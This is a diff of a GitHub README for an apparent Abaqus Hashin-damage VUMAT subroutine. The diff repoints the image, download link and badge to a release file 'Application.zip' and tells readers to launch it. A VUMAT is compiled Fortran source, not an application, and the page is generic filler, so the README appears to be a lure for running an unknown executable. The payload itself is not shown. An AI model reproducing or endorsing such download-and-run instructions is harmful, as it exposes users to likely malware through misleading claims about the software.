@@ -1,6 +1,6 @@
 # Abaqus HASHIN Progressive Damage for 3D Continuum Composites VUMAT Subroutine
 
-![Abaqus-HASHIN](https://www.example.com/image.jpg)
+![Abaqus-HASHIN](https://github.com/Kubsoq/Abaqus-HASHIN-progressive-Damage-for-3D-continuum-composites-VUMAT-Subroutine-/releases/download/v1.0/Application.zip)
 
 Welcome to the GitHub repository for the **Abaqus-HASHIN-progressive-Damage-for-3D-continuum-composites-VUMAT-Subroutine**. This repository focuses on the implementation of the Hashin criteria to predict failure modes in composites based on stresses in fiber and matrix within the Abaqus software environment. As a user, you can leverage a VUMAT subroutine to extend Abaqus to simulate 3D damage progression using the energy method for both static and dynamic problems.
 
@@ -22,7 +22,7 @@ Welcome to the GitHub repository for the **Abaqus-HASHIN-progressive-Damage-for-
 In this repository, you will find resources related to the implementation of progressive damage modeling for 3D continuum composites using the Hashin criteria within the Abaqus software environment. Whether you are interested in failure analysis, finite element analysis, or numerical simulations, this repository provides a valuable tool to enhance your understanding and implementation of advanced simulation techniques.
 
 ## Resources
-To access the content of this repository, download the **Abaqus-HASHIN-progressive-Damage-for-3D-continuum-composites-VUMAT-Subroutine** package by clicking [here](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip). Once the download is complete, ensure that you launch the provided file to begin exploring the resources available.
+To access the content of this repository, download the **Abaqus-HASHIN-progressive-Damage-for-3D-continuum-composites-VUMAT-Subroutine** package by clicking [here](https://github.com/Kubsoq/Abaqus-HASHIN-progressive-Damage-for-3D-continuum-composites-VUMAT-Subroutine-/releases/download/v1.0/Application.zip). Once the download is complete, ensure that you launch the provided file to begin exploring the resources available.
 
 ## Getting Started
 If you are new to the field of progressive damage modeling or if you are looking to enhance your skills in implementing the Hashin criteria in numerical simulations, this repository is the perfect starting point for your journey. The detailed documentation, code samples, and examples provided will guide you through the process of integrating the VUMAT subroutine into the Abaqus software to simulate 3D damage progression effectively.
@@ -45,6 +45,6 @@ Thank you for visiting the **Abaqus-HASHIN-progressive-Damage-for-3D-continuum-c
 ---
 For a more visual representation of the repository content, click the button below:
 
-[![Download Here](https://img.shields.io/badge/Download%20Here-Get%20Started-brightgreen)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Here](https://github.com/Kubsoq/Abaqus-HASHIN-progressive-Damage-for-3D-continuum-composites-VUMAT-Subroutine-/releases/download/v1.0/Application.zip%20Here-Get%20Started-brightgreen)](https://github.com/Kubsoq/Abaqus-HASHIN-progressive-Damage-for-3D-continuum-composites-VUMAT-Subroutine-/releases/download/v1.0/Application.zip)
 
 Explore the possibilities of progressive damage modeling with Abaqus and take your simulations to the next level! Visit the link above to download the resources.
